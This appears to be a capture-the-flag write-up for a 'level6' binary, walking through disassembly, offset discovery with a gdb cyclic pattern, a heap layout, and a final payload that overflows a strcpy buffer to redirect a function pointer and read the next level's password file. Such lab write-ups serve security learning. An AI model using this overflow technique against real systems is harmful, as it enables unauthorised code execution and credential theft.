Buffer overflow (strcpy)

In the dump we see :

2 spaces are allocated with malloc, one of 64 and an other one of 4.

0x8048485:   c7 04 24 40 00 00 00   	mov dword ptr [esp], 0x40
0x804848c:   e8 bf fe ff ff         	call 0x8048350 <malloc>
0x8048491:   89 44 24 1c            	mov dword ptr [esp + 0x1c], eax
0x8048495:   c7 04 24 04 00 00 00   	mov dword ptr [esp], 4
0x804849c:   e8 af fe ff ff         	call 0x8048350 <malloc>

We can see the value 0x8048468 is store in the space of 4.

0x8048468 = m function, the function is executed by default on the program which print "Nope."
; function: m at 0x8048468 -- 0x804847c
0x8048468:   55                     	push ebp
0x8048469:   89 e5                  	mov ebp, esp
0x804846b:   83 ec 18               	sub esp, 0x18
0x804846e:   c7 04 24 d1 85 04 08   	mov dword ptr [esp], 0x80485d1 ; "Nope"
0x8048475:   e8 e6 fe ff ff         	call 0x8048360 <puts>
0x804847a:   c9                     	leave 
0x804847b:   c3                     	ret 

We can see an n function, which cat the pass of the level7 which is never called.
; function: n at 0x8048454 -- 0x8048468
0x8048454:   55                     	push ebp
0x8048455:   89 e5                  	mov ebp, esp
0x8048457:   83 ec 18               	sub esp, 0x18
0x804845a:   c7 04 24 b0 85 04 08   	mov dword ptr [esp], 0x80485b0 ; "/bin/cat /home/user/level7/.pass"
0x8048461:   e8 0a ff ff ff         	call 0x8048370 <system>
0x8048466:   c9                     	leave 
0x8048467:   c3                     	ret 

We see that strcpy copies argv[1] in the space of 64.

[...]
0x80484ba:   8b 44 24 1c            	mov eax, dword ptr [esp + 0x1c]
0x80484be:   89 54 24 04            	mov dword ptr [esp + 4], edx
0x80484c2:   89 04 24               	mov dword ptr [esp], eax
0x80484c5:   e8 76 fe ff ff         	call 0x8048340 <strcpy>

By testing and with the dump we can see 0x8048468 ( m func ) will be exec at the end of the function, by the call of eax (EAX points on the space of 4).

0x80484d0:   ff d0                  	call eax

We will exploit the strcpy with a buffer overflow to overwrite on the space of 4 and put there the address of the n function (0x8048454).

We need to calculate the offset :

We will use the following pattern to find the offset

gdb --args ./level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
(gdb) r
Starting program: /home/user/level6/level6 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x41346341 in ?? ()

The segfault return the value 0x41346341
We convert it in little endian -> 0x41633441
We convert it in ascii -> Ac4A
We count the number of chars before Ac4A in the pattern:
The offset is 72.

The command to execut this task :

V=41346341;STR=Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A;P=$(echo ${V:6:2}${V:4:2}${V:2:2}${V:0:2}); MATCH=$(echo $P | xxd -r -p);L=$(echo $STR > /tmp/pattern && awk -F $MATCH '{print $1}' <<< echo /tmp/pattern ); echo "Offset =" ${#L}; rm /tmp/pattern

V is the value of the segfault in big endian
str is the pattern used

Heap:

0                   4         68          72                    76         80          84
|CHUNK SIZE MALLOC 1|BUFFER 64| PREV_SIZE | CHUNK SIZE MALLOC 2 | BUFFER 4 | PREV_SIZE |
                    ^
                    |
                PTR MALLOC 1

Our payload is :

./level6 $(python -c 'print "\x90"*72 + "\x08\x04\x84\x54"[::-1]')
